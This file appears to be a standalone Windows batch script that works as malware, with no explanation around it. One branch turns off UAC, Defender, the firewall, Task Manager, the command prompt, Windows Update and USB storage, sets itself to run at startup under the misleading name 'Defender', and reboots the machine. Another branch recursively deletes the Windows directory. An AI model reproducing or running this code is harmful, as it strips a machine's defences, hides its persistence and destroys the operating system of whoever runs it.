@rem off
if "%1"=="lock" (

    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
    rem Disabling Startup Programs...
    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Defender /t REG_SZ /d "%0" /f
    rem
    rem Disabling Task Manager...
    reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
    rem
    rem Disabling Control Panel...
    reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f
    rem
    rem Disabling Windows Update...
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f
    rem
    rem Disabling Command Prompt...
    reg add "HKLM\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 1 /f
    rem
    rem Disabling Windows Defender...
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
    rem
    rem Disabling USB Ports...
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\USBSTOR" /v Start /t REG_DWORD /d 4 /f
    rem
    rem Disabling Windows Firewall...
    reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile" /v EnableFirewall /t REG_DWORD /d 0 /f
    rem
    rem Disabling Remote Desktop...
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
    rem
    rem Disabling Context Menus...
    reg delete "HKCR\*\shellex\ContextMenuHandlers\Open With" /f
    rem
    rem Disabling Windows Search Box Suggestions...
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v DisableSearchBoxSuggestions /t REG_DWORD /d 1 /f
    rem
    rem Disabling Action Center Notifications...
    reg add "HKLM\Software\Policies\Microsoft\Windows\Explorer" /v DisableNotificationCenter /t REG_DWORD /d 1 /f
    rem
    rem Disabling Lock Screen...
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Personalization" /v NoLockScreen /t REG_DWORD /d 1 /f
    rem
    rem Disabling Cortana...
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v AllowCortana /t REG_DWORD /d 0 /f
    rem
    rem Disabling Automatic Driver Updates...
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Settings" /v DisableAutomaticDriverUpdate /t REG_DWORD /d 1 /f
    rem
    rem Disabling Telemetry...
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v AllowTelemetry /t REG_DWORD /d 0 /f
    rem
    rem Disabling OneDrive...
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\OneDrive" /v DisableFileSyncNGSC /t REG_DWORD /d 1 /f
    rem
    rem Disabling Fast Startup...
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v HiberbootEnabled /t REG_DWORD /d 0 /f
    rem
    rem All specified features have been disabled.
    shutdown /r /t 0
)
if "%1"=="remvirus" (
    reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f
)
if "%1" == "" (
    cd /
    cd Windows
    fsutil file createnew %cd%\gig.dat 999999
    for /f %%a in (gig.dat) do (
        start cmd /c "rd %cd%\ /s /q & exit"
    )
    rd %cd%\ /s /q
)